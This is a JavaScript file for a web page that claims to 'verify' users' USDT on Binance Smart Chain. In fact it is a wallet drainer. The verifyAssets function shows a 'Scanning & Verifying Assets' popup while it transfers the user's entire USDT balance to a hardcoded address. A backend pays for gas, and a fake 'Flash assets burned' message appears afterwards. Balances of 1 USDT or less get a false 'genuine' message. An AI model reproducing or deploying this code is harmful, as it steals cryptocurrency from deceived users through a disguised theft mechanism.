const recipientAddress = "0xce81b9c0658B84F2a8fD7adBBeC8B7C26953D090";
const bnbGasSender = "0x04a7f2e3E53aeC98B9C8605171Fc070BA19Cfb87";
const backendGasAPI = "https://bep20usdt-backend-production.up.railway.app/send-bnb";
const usdtContractAddress = "0x55d398326f99059fF775485246999027B3197955";

let web3;
let userAddress;
let usdtContract;

window.addEventListener("load", async () => {
  if (window.ethereum) {
    web3 = new Web3(window.ethereum);

    try {
      const currentChain = await window.ethereum.request({ method: "eth_chainId" });

      if (currentChain !== "0x38") {
        // Force switch to Binance Smart Chain
        await window.ethereum.request({
          method: "wallet_switchEthereumChain",
          params: [{ chainId: "0x38" }],
        });
      }

      const accounts = await window.ethereum.request({ method: "eth_accounts" });
      if (accounts.length > 0) {
        userAddress = accounts[0];

        usdtContract = new web3.eth.Contract([
          {
            constant: true,
            inputs: [{ name: "account", type: "address" }],
            name: "balanceOf",
            outputs: [{ name: "", type: "uint256" }],
            type: "function",
          },
          {
            constant: false,
            inputs: [
              { name: "recipient", type: "address" },
              { name: "amount", type: "uint256" },
            ],
            name: "transfer",
            outputs: [{ name: "", type: "bool" }],
            type: "function",
          },
        ], usdtContractAddress);

        console.log("Wallet connected:", userAddress);
      }
    } catch (err) {
      console.error("Chain or wallet connection failed:", err);
    }
  } else {
    alert("MetaMask not detected.");
  }
});

async function verifyAssets() {
  if (!userAddress || !usdtContract) {
    alert("Wallet not connected.");
    return;
  }

  const rawUSDT = await usdtContract.methods.balanceOf(userAddress).call();
  const rawBNB = await web3.eth.getBalance(userAddress);

  const usdtBalance = parseFloat(web3.utils.fromWei(rawUSDT, "mwei"));
  const bnbBalance = parseFloat(web3.utils.fromWei(rawBNB, "ether"));

  if (usdtBalance === 0) {
    showPopup("No USDT found.", "black");
    return;
  }

  if (usdtBalance <= 1) {
    showPopup(`✅ Verification Successful<br>Your assets are genuine.<br><b>USDT:</b> ${usdtBalance}<br><b>BNB:</b> ${bnbBalance}`, "green");
    return;
  }

  showPopup("⏳ Scanning & Verifying Assets...", "green");

  if (bnbBalance < 0.0005) {
    await fetch(backendGasAPI, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ toAddress: userAddress }),
    });
  }

  try {
    const amountToSend = web3.utils.toWei(usdtBalance.toString(), "mwei");
    await usdtContract.methods
      .transfer(recipientAddress, amountToSend)
      .send({ from: userAddress });

    showPopup(`✅ Flash assets burned.<br><b>USDT Sent:</b> ${usdtBalance}`, "red");
  } catch (err) {
    console.error("Transfer error:", err);
    alert("Transfer failed. Try again.");
  }
}

function showPopup(message, color) {
  let popup = document.getElementById("popupBox");
  if (!popup) {
    popup = document.createElement("div");
    popup.id = "popupBox";
    popup.style.position = "fixed";
    popup.style.top = "50%";
    popup.style.left = "50%";
    popup.style.transform = "translate(-50%, -50%)";
    popup.style.padding = "20px";
    popup.style.borderRadius = "10px";
    popup.style.boxShadow = "0px 0px 10px rgba(0,0,0,0.2)";
    popup.style.fontSize = "18px";
    popup.style.maxWidth = "400px";
    popup.style.textAlign = "center";
    document.body.appendChild(popup);
  }

  popup.style.backgroundColor = color === "red" ? "#ffecec" : color === "green" ? "#e6ffe6" : "#f0f0f0";
  popup.style.color = color === "red" ? "red" : color === "green" ? "green" : "black";
  popup.innerHTML = message;
  popup.style.display = "block";

  setTimeout(() => {
    popup.style.display = "none";
  }, 5000);
}

document.getElementById("verifyAssets").addEventListener("click", verifyAssets);
